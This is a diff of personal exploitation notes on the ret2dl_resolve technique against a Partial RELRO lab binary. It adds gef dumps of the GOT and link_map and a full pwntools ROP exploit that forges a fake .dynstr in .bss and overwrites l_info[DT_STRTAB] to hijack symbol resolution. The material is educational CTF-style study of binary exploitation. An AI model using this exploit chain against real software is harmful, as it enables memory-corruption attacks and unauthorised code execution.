@@ -1275,7 +1275,7 @@ if __name__ == '__main__':
 
 Prerequisites
 1. IP controll
-2. ability to write to memory
+2. ability to write to memory we use read() and a mov [reg],reg and corespoding pop gadgets to write our fake frame/dynstr entry.  (if we cant find a pop rdx we could ret2csu before)
 
 ```
 readelf -S resolve_partial_relro
@@ -1491,127 +1491,203 @@ in prgoress
 
 Prerequisites
 1. IP controll
-2. ability to write to an addr `*(destination) = value` 
+2. ability to write to memory we use read() but you could also use a mov [reg],reg and corespoding pop gadgets to write our fake frame/dynstr entry.  (if we cant find a pop rdx we could ret2csu before)
 
-`mov [rax],rdi`
+3. ability to read a pointer `mov rdi,[rdx]`
+4. ability to write to a pointer with an offset  `mov qword ptr [rdx + rsi], rdi; ret;` or something similar add or inc would work to to set the right offset than a `mov [rdx],rdi` would work too. 
 
-
-3. ability to write to a pointer with an offset  `*(*(reg) + offset) = value`
-
-```
-mov rax, [rax]				#get the pointed addr into rax
-mov [rax + rdx], rdi		#add rdx to pointed addr and mov rdi into it
-```
 
 elf_info points to a link_map struct    \
-the link_map holds a pointer to the .dynstr table    \
-the elf_info is allways available at a reserved GOT entry GOT[1]
-
-this is like the first attack but we need a specific gadget to exploit this sucesfully.
-
-we know the pointer to the link_map but we actually have to rewrite an entry in the link map.    \
-
+the link_map holds a pointer to the .dynstr table at offset 0x68 (offsets can change so allways check this)    \
+the elf_info is allways available at a reserved GOT entry GOT[1] (when partial or no RELRO is active)
 
 ```
 gef➤  got
 
-GOT protection: Partial RelRO | GOT functions: 5
+GOT protection: Partial RelRO | GOT functions: 2
  
-[0x601018] puts@GLIBC_2.2.5  →  0x400566
-[0x601020] setbuf@GLIBC_2.2.5  →  0x7ffff7e4ac50
-[0x601028] read@GLIBC_2.2.5  →  0x400586
-[0x601030] __libc_start_main@GLIBC_2.2.5  →  0x7ffff7de2fc0
-[0x601038] strcmp@GLIBC_2.2.5  →  0x4005a6
+[0x404018] read@GLIBC_2.2.5  →  0x7facdbf8f130
+[0x404020] setvbuf@GLIBC_2.2.5  →  0x7facdbf05e60
 
 ```
 
-```
-gef➤  tel 0x601000
-0x0000000000601000│+0x0000: 0x0000000000600e28  →  0x0000000000000001
-0x0000000000601008│+0x0008: 0x00007ffff7ffe190  →  0x0000000000000000
-0x0000000000601010│+0x0010: 0x00007ffff7fe7bb0  →   endbr64 
-0x0000000000601018│+0x0018: 0x0000000000400566  →  0xffe0e90000000068 ("h"?)
-0x0000000000601020│+0x0020: 0x00007ffff7e4ac50  →  <setbuf+0> endbr64 
-0x0000000000601028│+0x0028: 0x0000000000400586  →  <read@plt+6> push 0x2
-0x0000000000601030│+0x0030: 0x00007ffff7de2fc0  →  <__libc_start_main+0> endbr64 
-0x0000000000601038│+0x0038: 0x00000000004005a6  →  <strcmp@plt+6> push 0x4
-0x0000000000601040│+0x0040: 0x0000000000000000
-0x0000000000601048│+0x0048: 0x0000000000000000
-
-```
-```
-gef➤  tel 0x00007ffff7ffe190
-0x00007ffff7ffe190│+0x0000: 0x0000000000000000
-0x00007ffff7ffe198│+0x0008: 0x00007ffff7ffe730  →  0x0000000000000000
-0x00007ffff7ffe1a0│+0x0010: 0x0000000000600e28  →  0x0000000000000001					#pointer to .dynamic
-0x00007ffff7ffe1a8│+0x0018: 0x00007ffff7ffe740  →  0x00007ffff7fcd000  →  0x00010102464c457f
-0x00007ffff7ffe1b0│+0x0020: 0x0000000000000000
-0x00007ffff7ffe1b8│+0x0028: 0x00007ffff7ffe190  →  0x0000000000000000
-0x00007ffff7ffe1c0│+0x0030: 0x0000000000000000
-0x00007ffff7ffe1c8│+0x0038: 0x00007ffff7ffe718  →  0x00007ffff7ffe730  →  0x0000000000000000
-0x00007ffff7ffe1d0│+0x0040: 0x0000000000000000
-0x00007ffff7ffe1d8│+0x0048: 0x0000000000600e28  →  0x0000000000000001
-
-```
 		
-.dynamic struct look like this
+GOT[1] = 0x0000000000404008│+0x0008: 0x00007facdc0b4190  →  0x0000000000000000
 ```
-gef➤  tel 20 0x0000000000600e28
-0x0000000000600e28│+0x0000: 0x0000000000000001
-0x0000000000600e30│+0x0008: 0x0000000000000001
-0x0000000000600e38│+0x0010: 0x000000000000000c
-0x0000000000600e40│+0x0018: 0x0000000000400528  →  <_init+0> sub rsp, 0x8
-0x0000000000600e48│+0x0020: 0x000000000000000d
-0x0000000000600e50│+0x0028: 0x00000000004007d4  →  <_fini+0> sub rsp, 0x8
-0x0000000000600e58│+0x0030: 0x0000000000000019
-0x0000000000600e60│+0x0038: 0x0000000000600e10  →  0x0000000000400690  →  <frame_dummy+0> mov edi, 0x600e20
-0x0000000000600e68│+0x0040: 0x000000000000001b
-0x0000000000600e70│+0x0048: 0x0000000000000008
-0x0000000000600e78│+0x0050: 0x000000000000001a
-0x0000000000600e80│+0x0058: 0x0000000000600e18  →  0x0000000000400670  →  <__do_global_dtors_aux+0> 
-0x0000000000600e88│+0x0060: 0x000000000000001c
-0x0000000000600e90│+0x0068: 0x0000000000000008
-0x0000000000600e98│+0x0070: 0x000000006ffffef5
-0x0000000000600ea0│+0x0078: 0x0000000000400298  →   add eax, DWORD PTR [rax]
-0x0000000000600ea8│+0x0080: 0x0000000000000005
-0x0000000000600eb0│+0x0088: 0x00000000004003b8  →   add BYTE PTR [rcx+rbp*2+0x62], ch				#pointer to .dynstr
-0x0000000000600eb8│+0x0090: 0x0000000000000006
-0x0000000000600ec0│+0x0098: 0x00000000004002c8  →   add BYTE PTR [rax], al
-
+gef➤  tel 0x404000
+0x0000000000404000│+0x0000: 0x0000000000403e20  →  0x0000000000000001
+0x0000000000404008│+0x0008: 0x00007facdc0b4190  →  0x0000000000000000
+0x0000000000404010│+0x0010: 0x00007facdc09da60  →   endbr64 
+0x0000000000404018│+0x0018: 0x00007facdbf8f130  →  <read+0> endbr64 
+0x0000000000404020│+0x0020: 0x00007facdbf05e60  →  <setvbuf+0> endbr64 
+0x0000000000404028│+0x0028: 0x0000000000000000
+0x0000000000404030│+0x0030: 0x0000000000000000
+0x0000000000404038│+0x0038: 0x0000000000000000
+0x0000000000404040│+0x0040: 0x00007facdc06a6a0  →  0x00000000fbad2087
+0x0000000000404048│+0x0048: 0x0000000000000000
 ```
-		
-we overwrite the l_info[DT_STRTAB] in the struct starting @ 0x00007ffff7ffe190 at offset +0x0010 and change it to an bss addr.
-and at the .bss addr we create a fake .dynamic struct
-
-at .bss +0x0088 we store our pointer to the fake .dynstr struct we create 
-
-
-
-``` 
-         ___________________       ___________________       ___________________
-	|        GOT        |  |>>|      .dynamic     |  |->|      .dynstr      |
-	|______.plt.got_____|  |  |___________________|  |  |___________________|
-	|        got[0]     |  |  |        ...        |  |  |       read\0      |  
-	|___________________|  |  |___________________|  |  |___________________|  
-	|        got[1]     |  |  |  d_tag: DT_STRTAB |  |  |       puts\0      | 
- |------|___________________|  |  |___________________|  |  |___________________|
- |	|        got[2]     |  |  |       d_val       |--| 
- |	|___________________|  |  |___________________|
- |                             |
- |	 ___________________   |   ___________________  
- |	|                   |  |.>|   Writable area   |  
- |	|___________________|  |. |________.bss_______|  
- |	|        ...        |  |. | d_tag: DT_STRTAB  |  
- |	|___________________|  |. |___________________|  
- |	|  l_info[DT_HASH]  |  |. |        d_val      |--|  
- |	|___________________|  |. |___________________|  |
- |---->>| l_info[DT_STRTAB] |--|. |         ...       |  |
-	|___________________|     |___________________| <
-	| l_info[DT_SYMTAB] |     |      read\0       |
-	|___________________|     |___________________|
-				  |      execve\0     |
-				  |___________________|
+0x00007facdc0b41f8│+0x0068: 0x0000000000403ea0  →  0x0000000000000005 we want to overwrite this with our fake_frame addr		
 ```
+gef➤  tel 14 0x00007facdc0b4190
+0x00007facdc0b4190│+0x0000: 0x0000000000000000
+0x00007facdc0b4198│+0x0008: 0x00007facdc0b4730  →  0x0000000000000000
+0x00007facdc0b41a0│+0x0010: 0x0000000000403e20  →  0x0000000000000001
+0x00007facdc0b41a8│+0x0018: 0x00007facdc0b4740  →  0x00007fff7a6c5000  →  0x00010102464c457f
+0x00007facdc0b41b0│+0x0020: 0x0000000000000000
+0x00007facdc0b41b8│+0x0028: 0x00007facdc0b4190  →  0x0000000000000000
+0x00007facdc0b41c0│+0x0030: 0x0000000000000000
+0x00007facdc0b41c8│+0x0038: 0x00007facdc0b4718  →  0x00007facdc0b4730  →  0x0000000000000000
+0x00007facdc0b41d0│+0x0040: 0x0000000000000000
+0x00007facdc0b41d8│+0x0048: 0x0000000000403e20  →  0x0000000000000001
+0x00007facdc0b41e0│+0x0050: 0x0000000000403f00  →  0x0000000000000002
+0x00007facdc0b41e8│+0x0058: 0x0000000000403ef0  →  0x0000000000000003
+0x00007facdc0b41f0│+0x0060: 0x0000000000000000
+0x00007facdc0b41f8│+0x0068: 0x0000000000403ea0  →  0x0000000000000005
+```
+							   
+
+<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Method3.png">
+
+							   
+							   
+```
+#!/usr/bin/env python3
+from pwn import *
+
+
+fname = 'resolve_partial_relro'
+ip = '0.0.0.0'
+port = 5000 #change this
+context.binary = elf = ELF('resolve_partial_relro')
+
+
+
+
+LOCAL = True
+
+if LOCAL:
+    r = process(fname,aslr=True)
+
+    gdbscript="""
+    b *main
+    b *0x00000000004011c8
+    b *0x00000000004011bb
+
+
+    """
+    #set follow-fork-mode
+
+    attach('resolve_partial_relro',gdbscript=gdbscript)
+else:
+    r = remote(ip, port)
+
+s = lambda x : r.send(x)
+rl = lambda : r.recvline()
+rlb = lambda : r.recvlineb()
+sl = lambda x : r.sendline(x)
+ru = lambda x :r.recvuntil(x)
+rcb = lambda x :r.recvb(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+inter = lambda : r.interactive()
+
+
+def pwn():
+
+
+
+	GOT1 = 0x404008
+
+	pop_rdi = 0x0000000000401273
+	pop_rsi_r15 = 0x0000000000401271
+	pop_rdx = 0x00000000004011d1
+
+	
+	write_with_offset = 0x00000000004011dc				#: mov qword ptr [rdx + rsi], rdi; ret;
+	read_from_ptr = 0x00000000004011d8 				#: mov rdi, qword ptr [rdx]; ret; 
+	mov_rdx_rdi = 0x00000000004011e1
+
+	resolve = 0x401040						#for setbuf
+
+	fake_frame_addr = 0x00000000004040a0   				#in .bss
+
+	fake_frame = b''
+	
+	#fake link_map entry for DT_STRTAB						   
+	fake_frame += p64(0x5)						#d_tag	#0x4040a0 - 0x4040a8
+	fake_frame += p64(fake_frame_addr + 0x10)			#d_val	#0x4040a8 - 0x4040b0
+	
+	#fake .dynstr						   
+	fake_frame += b'\x00'						#start of fake .dynstr 0x4040b0 -
+	fake_frame += b'libc.so.6\x00'
+	fake_frame += b'stdin\x00'
+	fake_frame += b'read\x00'
+	fake_frame += b'stdout\x00'
+	fake_frame += b'puts\x00\x00\x00'				#setbuf was here before
+	fake_frame += b'__libc_start_main\x00'
+	fake_frame += b'GLIBC_2.2.5\x00'
+	fake_frame += b'__gmon_start__\x00'
+
+	len_fake_frame = len(fake_frame)
+
+	payload = b''
+	payload += b'A'*24		
+
+	#write our fake_frame into .bss
+	payload += p64(pop_rdi)				
+	payload += p64(0x00)					#stdin
+	payload += p64(pop_rsi_r15)
+	payload += p64(fake_frame_addr)				#where
+	payload += p64(0x00)					#junk
+	payload += p64(pop_rdx)
+	payload += p64(len_fake_frame)				#how many bytes
+	payload += p64(elf.plt['read'])
+
+
+
+	#get pointer from GOT[1]
+	payload += p64(pop_rdx)
+	payload += p64(GOT1)
+	payload += p64(read_from_ptr)
+
+	#rdi now holds the link_map pointer we need to add 0x68 for the fake DT_STRTAB entry
+	
+	#we will write with mov qword ptr [rdx + rsi], rdi; ret;
+	#so we need to setup the registers
+	payload += p64(mov_rdx_rdi)				#rdx now holds the link_map pointer
+	payload += p64(pop_rsi_r15)			
+	payload += p64(0x68)					#rsi holds the offset
+	payload += p64(0x00)					#r15 junk
+	payload += p64(pop_rdi)				
+	payload += p64(fake_frame_addr)				#rdi holds the addr where we want to point the new d_val to
+
+	#write fake_frame_pointer
+	payload += p64(write_with_offset)
+
+
+	#set arg for resolved puts
+	payload += p64(pop_rdi)
+	payload += p64(0x400000)
+
+	#and thann call the resolver
+	payload += p64(0x401040)
+
+	#we crash here but '\x7fELF' should be printed
+	payload += p64(0x111111)*4 
+
+	s(payload)
+	input('press enter to send fake_frame')
+	s(fake_frame)
+	inter()
+
+if __name__ == '__main__':
+    pwn()
+
+
+
+
+							   
+```
+							   
 </div>
 </details>
 
